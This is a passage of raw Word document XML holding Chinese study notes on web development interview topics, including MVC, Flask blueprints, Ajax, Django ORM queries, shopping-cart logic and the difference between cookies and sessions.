        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>好处：将业务逻辑，数据模型，用户界面都分离出来，实现解耦合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E8E4B5C" w14:textId="00DEEA93" w:rsidR="007A6093" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>举例子：注册（数据模型，业务链接）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770B0E91" w14:textId="33EE1237" w:rsidR="00325D76" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Flask:使用蓝图进行模块划分</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3ACE8D" w14:textId="1915F939" w:rsidR="00325D76" w:rsidRDefault="000A3959" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="4F4F4F"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>008</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Ajax?</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>异步</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>javascript</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDAFD27" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用javascript语言与服务器进行交互，传递的数据是xml格式也可以是json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2362E26D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Ajax 可以实现局部刷新功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9D5F82" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>常见应用场景：自动提示搜索内容，注册，信息校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CEBC638" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>优点：异步向服务器发送请求，无需刷新整个界面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3112FD6C" w14:textId="4F65BC0B" w:rsidR="00325D76" w:rsidRPr="000A3959" w:rsidRDefault="00325D76" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3959">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>缺点：服务器压力比较大</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4090D800" w14:textId="1F844ABC" w:rsidR="00325D76" w:rsidRPr="007A6093" w:rsidRDefault="000A3959" w:rsidP="007A6093">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lastRenderedPageBreak/>
        <w:t>009</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">ORM </w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>对象关系映射</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF2C70A" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>O object</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047D901A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>R relationship</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1079B9BD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>M mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6391848F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用操作对象的方式来操作数据库，类对应表格 属性对应字段 对象对应记录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2681332D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用字段，onetoone,…foreignkey…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00DAF427" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>正向查询 反向查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E4CF5B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>多表查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBB4195" w14:textId="6AD5387C" w:rsidR="00325D76" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>多张表查询时 某个属性可用多个双下划线方式相连</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DCFB2D8" w14:textId="2CC8A493" w:rsidR="00325D76" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>F和Q查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440CC769" w14:textId="77777777" w:rsidR="00325D76" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>项目</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394AD0CD" w14:textId="2DDF14A6" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:noProof/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="738A7A32" wp14:editId="0AE92939">
            <wp:extent cx="4467225" cy="2486025"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="133" name="图片 1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在这里插入图片描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67225" cy="2486025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="06391128" w14:textId="131AF087" w:rsidR="00325D76" w:rsidRPr="007A6093" w:rsidRDefault="000A3959" w:rsidP="007A6093">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hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>购物车逻辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0176B5D6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>从商品详情点击购物车按钮，跳转到购物车中间页</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E752F1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>首先判断当前用户是否登录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F16C1D2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1如果没有登录，将数据保存到session中，重定向登录界面，登录成功后重定向到购物车中间页，判断购物车是否有此商品 如果有则修改 ，如果没有就保存到购物车。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5653E659" w14:textId="4665EBE0" w:rsidR="00325D76" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2如果登录，判断购物车是否有此商品 如果有则修改 ，如果没有就保存到购物车。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0477980E" w14:textId="77777777" w:rsidR="000A3959" w:rsidRPr="007A6093" w:rsidRDefault="000A3959" w:rsidP="000A3959">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014</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>区别？？？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B111318" w14:textId="77777777" w:rsidR="000A3959" w:rsidRPr="0057133E" w:rsidRDefault="000A3959" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1 cookie数据存放在浏览器（本地）上，session数据放在服务器上</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591680E5" w14:textId="77777777" w:rsidR="000A3959" w:rsidRPr="0057133E" w:rsidRDefault="000A3959" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2 cookie不是很安全，别人可用本地进行cookie欺骗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5BB0B9" w14:textId="77777777" w:rsidR="000A3959" w:rsidRPr="0057133E" w:rsidRDefault="000A3959" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3 session相对cookie更安全，当访问增多少，会占用服务器性能，如果减轻服务器性能，应用cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9799C1" w14:textId="77777777" w:rsidR="000A3959" w:rsidRPr="0057133E" w:rsidRDefault="000A3959" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4 单个cookie保存数据不能超过4k（很多浏览器&lt;=20）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F22DD8" w14:textId="77777777" w:rsidR="000A3959" w:rsidRPr="0057133E" w:rsidRDefault="000A3959" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>5建议将登陆等重要信息放在session中，其他信息可以放在cookie中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D5A22A" w14:textId="77777777" w:rsidR="000A3959" w:rsidRDefault="000A3959" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>补充</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BB1845" w14:textId="77777777" w:rsidR="000A3959" w:rsidRPr="0057133E" w:rsidRDefault="000A3959" w:rsidP="000A3959">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:noProof/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C0E47C4" wp14:editId="3AE4034B">
            <wp:extent cx="5276850" cy="2362200"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="132" name="图片 1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在这里插入图片描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6C9F084C" w14:textId="77777777" w:rsidR="000A3959" w:rsidRDefault="000A3959" w:rsidP="000A3959">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="1A1A1A"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="columnpageheader-titlemeta"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:color w:val="8590A6"/>
        </w:rPr>
        <w:t>首发于</w:t>
      </w:r>
      <w:hyperlink r:id="rId195" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
            <w:b/>
            <w:bCs/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
